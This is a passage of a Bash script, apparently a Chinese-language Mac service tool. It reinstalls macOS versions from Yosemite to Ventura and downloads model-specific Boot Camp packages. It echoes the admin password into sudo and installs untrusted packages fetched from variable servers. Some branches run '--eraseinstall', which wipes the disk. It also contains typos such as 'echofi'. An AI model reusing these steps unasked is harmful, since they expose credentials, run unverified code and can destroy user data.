hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Install\ OS\ X/InstallMacOSX.pkg -target /
diskutil eject /Volumes/Install\ OS\ X
umount -f /Volumes/Install\ OS\ X
diskutil eject $(diskutil list | grep 'Install OS X' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
echo "n" | /Applications/Install\ OS\ X\ Yosemite.app/Contents/Resources/startosinstall
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
echo "$pass" | sudo -S sudo /Applications/Install\ OS\ X\ Yosemite.app/Contents/Resources/startosinstall --agreetolicense
fi

if [ "$wzbsjmac" = "10.11" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Install\ OS\ X/InstallMacOSX.pkg -target /
diskutil eject /Volumes/Install\ OS\ X
umount -f /Volumes/Install\ OS\ X
diskutil eject $(diskutil list | grep 'Install OS X' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
echo "n" | /Applications/Install\ OS\ X\ El\ Capitan.app/Contents/Resources/startosinstall
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
echo "$pass" | sudo -S sudo /Applications/Install\ OS\ X\ El\ Capitan.app/Contents/Resources/startosinstall --agreetolicense
fi

if [ "$wzbsjmac" = "10.12" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Install\ macOS/InstallOS.pkg -target /
diskutil eject /Volumes/Install\ macOSInstall\ macOS
umount -f /Volumes/Install\ macOS
diskutil eject $(diskutil list | grep 'Install macOS' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
echo "n" | /Applications/Install\ macOS\ Sierra.app/Contents/Resources/startosinstall
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
echo "$pass" | sudo -S sudo /Applications/Install\ macOS\ Sierra.app/Contents/Resources/startosinstall --agreetolicense
fi

if [ "$wzbsjmac" = "10.13" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
if [ "$oldusb" ]; then
/tmp/aria2c -c -s25 -x16 -m0 -o app10.13.zip --console-log-level=warn --summary-interval=888888888 "$ip5/app10.13.zip" -d /tmp>/dev/null 2>&1
unzip -o /tmp/app10.13.zip -d "/Applications">/dev/null 2>&1
cp -R /Volumes/Install\ macOS\ High\ Sierra/Install\ macOS\ High\ Sierra.app/Contents/SharedSupport /Applications/Install\ macOS\ High\ Sierra.app/Contents
echo "n" | /Applications/Install\ macOS\ High\ Sierra.app/Contents/Resources/startosinstall
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Applications/Install macOS High Sierra.app/Contents/Resources/startosinstall' --agreetolicense" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Applications/Install\ macOS\ High\ Sierra.app/Contents/Resources/startosinstall --agreetolicense
fi
else
if [ "$qkmac" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS High Sierra/Install macOS High Sierra.app/Contents/Resources/startosinstall' --agreetolicense --eraseinstall" password "$pass" with administrator privileges
EOD
else
echofi "$pass" | sudo -S sudo /Volumes/Install\ macOS\ High\ Sierra/Install\ macOS\ High\ Sierra.app/Contents/Resources/startosinstall --agreetolicense --eraseinstall
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS High Sierra/Install macOS High Sierra.app/Contents/Resources/startosinstall' --agreetolicense" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ High\ Sierra/Install\ macOS\ High\ Sierra.app/Contents/Resources/startosinstall --agreetolicense
fi
fi
fi
fi

if [ "$wzbsjmac" = "10.14" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
if [ "$oldusb" ]; then
/tmp/aria2c -c -s25 -x16 -m0 -o app10.14.zip --console-log-level=warn --summary-interval=888888888 "$ip5/app10.14.zip" -d /tmp>/dev/null 2>&1
unzip -o /tmp/app10.14.zip -d "/Applications">/dev/null 2>&1
cp -R /Volumes/Install\ macOS\ Mojave/Install\ macOS\ Mojave.app/Contents/SharedSupport /Applications/Install\ macOS\ Mojave.app/Contents
echo "n" | /Applications/Install\ macOS\ Mojave.app/Contents/Resources/startosinstall
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Applications/Install macOS Mojave.app/Contents/Resources/startosinstall' --agreetolicense" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Applications/Install\ macOS\ Mojave.app/Contents/Resources/startosinstall --agreetolicense
fi
else
if [ "$qkmac" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Mojave/Install macOS Mojave.app/Contents/Resources/startosinstall' --agreetolicense --eraseinstall" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Mojave/Install\ macOS\ Mojave.app/Contents/Resources/startosinstall --agreetolicense --eraseinstall
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Mojave/Install macOS Mojave.app/Contents/Resources/startosinstall' --agreetolicense" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Mojave/Install\ macOS\ Mojave.app/Contents/Resources/startosinstall --agreetolicense
fi
fi
fi
fi

if [ "$wzbsjmac" = "10.15" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
if [ "$qkmac" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Catalina/Install macOS Catalina.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --eraseinstall" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Catalina/Install\ macOS\ Catalina.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --eraseinstall
fi
else
if [ "$oldusb" ]; then
echo "n" | /Volumes/Install\ macOS\ Catalina/Install\ macOS\ Catalina.app/Contents/Resources/startosinstall
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Catalina/Install macOS Catalina.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Catalina/Install\ macOS\ Catalina.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Catalina/Install macOS Catalina.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Catalina/Install\ macOS\ Catalina.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps
fi
fi
fi
fi

if [ "$wzbsjmac" = "11.0" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
if [ "$qkmac" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Big Sur/Install macOS Big Sur.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --eraseinstall --stdinpass" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Big\ Sur/Install\ macOS\ Big\ Sur.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --eraseinstall --stdinpass
fi
else
if [ "$oldusb" ]; then
echo "n" | /Volumes/Install\ macOS\ Big\ Sur/Install\ macOS\ Big\ Sur.app/Contents/Resources/startosinstall
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Big Sur/Install macOS Big Sur.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --stdinpass" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Big\ Sur/Install\ macOS\ Big\ Sur.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --stdinpass
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Big Sur/Install macOS Big Sur.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --stdinpass" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Big\ Sur/Install\ macOS\ Big\ Sur.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --stdinpass
fi
fi
fi
#echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/InstallAssistant11.pkg -target /
#echo "$pass" | sudo -S sudo /Applications/Install\ macOS\ Big\ Sur.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps$qkmac
fi

if [ "$wzbsjmac" = "12.0" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
if [ "$qkmac" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Monterey/Install macOS Monterey.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --eraseinstall --stdinpass" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Monterey/Install\ macOS\ Monterey.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --eraseinstall --stdinpass
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Monterey/Install macOS Monterey.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --stdinpass" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Monterey/Install\ macOS\ Monterey.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --stdinpass
fi
fi
#echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/InstallAssistant12.pkg -target /
#echo "$pass" | sudo -S sudo /Applications/Install\ macOS\ Monterey.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps$qkmac
fi

if [ "$wzbsjmac" = "13.0" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1
if [ "$qkmac" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Ventura/Install macOS Ventura.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --eraseinstall --stdinpass" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Ventura/Install\ macOS\ Ventura.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --eraseinstall --stdinpass
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Install macOS Ventura/Install macOS Ventura.app/Contents/Resources/startosinstall' --agreetolicense --forcequitapps --stdinpass" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /Volumes/Install\ macOS\ Ventura/Install\ macOS\ Ventura.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps --stdinpass
fi
fi
#echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/InstallAssistant13.pkg -target /
#echo "$pass" | sudo -S sudo /Applications/Install\ macOS\ Ventura.app/Contents/Resources/startosinstall --agreetolicense --forcequitapps$qkmac
fi

clear && printf "\e[3J"
echo
#echo "\033[36m如果电脑没自动重启安装，请通知技术员！\033[0m"
exit 0
}


DowBootCampDow(){
clear && printf "\e[3J"

	if [[ $modelbb = "MacBookAir9,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7854.zip"
	Download
	else	
	if [[ $modelbb = "MacBookAir8,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7269.zip"
	Download
	else	
	if [[ $modelbb = "MacBookAir8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7242.zip"
	Download
	else	
	if [[ $modelbb = "MacBookAir7,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookAir7,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookAir6,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookAir6,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else
	if [[ $modelbb = "MacBookAir4,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else	
	
	
	
	
	
	
	if [[ $modelbb = "MacBookPro16,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.8034.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro16,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7931.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro16,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7931.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro16,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7748.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro15,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7577.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro15,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7322.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro15,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7071.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro15,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7071.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro14,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6851.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro14,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6813.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro14,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6813.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro13,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6655.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro13,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6660.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro13,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6660.zip"
	Download
	else		
	if [[ $modelbb = "MacBookPro12,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro12,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro12,5" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro11,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro11,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro11,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro11,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro11,5" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro10,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro10,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro9,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro9,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacBookPro8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro8,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else	
	if [[ $modelbb = "MacBookPro8,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else		
	
	
	
	
	
	if [[ $modelbb = "MacBook10,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6813.zip"
	Download
	else		
	if [[ $modelbb = "MacBook9,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6427.zip"
	Download
	else		
	if [[ $modelbb = "MacBook8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	
	
	
	
	if [[ $modelbb = "iMac20,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.8082.zip"
	Download
	else		
	if [[ $modelbb = "iMac20,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.8082.zip"
	Download
	else
	if [[ $modelbb = "iMac19,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Download
	else
	if [[ $modelbb = "iMac19,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Download
	else	
	if [[ $modelbb = "iMacPro1,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Download
	else	
	if [[ $modelbb = "iMac18,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Download
	else	
	if [[ $modelbb = "iMac18,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Download
	else	
	if [[ $modelbb = "iMac18,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7866.zip"
	Download
	else
	if [[ $modelbb = "iMac17,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	Download
	else
	if [[ $modelbb = "iMac16,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	Download
	else
	if [[ $modelbb = "iMac16,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	Download
	else
	if [[ $modelbb = "iMac15,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "iMac14,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "iMac14,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "iMac14,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "iMac13,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "iMac13,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "iMac12,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else
	if [[ $modelbb = "iMac12,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else	
	if [[ $modelbb = "MacPro7,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7667.zip"
	Download
	else	
	if [[ $modelbb = "MacPro6,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacPro5,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "MacPro4,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else	
	
	
	
	
	

	if [[ $modelbb = "Macmini5,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else
	if [[ $modelbb = "Macmini5,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else
	if [[ $modelbb = "Macmini6,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "Macmini6,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "Macmini7,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	else
	if [[ $modelbb = "Macmini8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7139.zip"
	Download
	else
		
	if [[ $modelbb = *"Parallels14,1"* ]]; 
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Download
	else
	
	
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Download
	clear && printf "\e[3J"
	read -s -n1 -p "无法识别此机型支持Win10，无法开启下载"
	Customize
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi	
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi	
	fi		
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi		
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi		
    fi
	fi
	fi
	fi
	fi	
	fi
	fi		
 	fi
	fi	
	fi
	fi 
	fi 
	fi 
	fi 
	fi 

exit 0
}


DowBootCampIP(){
clear && printf "\e[3J"

	if [[ $modelbb = "MacBookAir9,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7854.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookAir8,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7269.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookAir8,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7242.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookAir7,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir7,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir6,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir6,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookAir4,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	Downloadzxc
	else	
	
	
	
	
	
	
	if [[ $modelbb = "MacBookPro16,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.8034.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro16,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7931.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro16,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7931.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro16,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7748.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7577.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7322.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7071.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro15,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.7071.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro14,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6851.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro14,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6813.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro14,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6813.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro13,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6655.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro13,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6660.zip"
	Downloadzxc
	else
	if [[ $modelbb = "MacBookPro13,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.1.6660.zip"
	Downloadzxc
	else		
	if [[ $modelbb = "MacBookPro12,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro12,4" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro12,5" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro11,1" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro11,2" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
	else	
	if [[ $modelbb = "MacBookPro11,3" ]];
	then
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	Downloadzxc
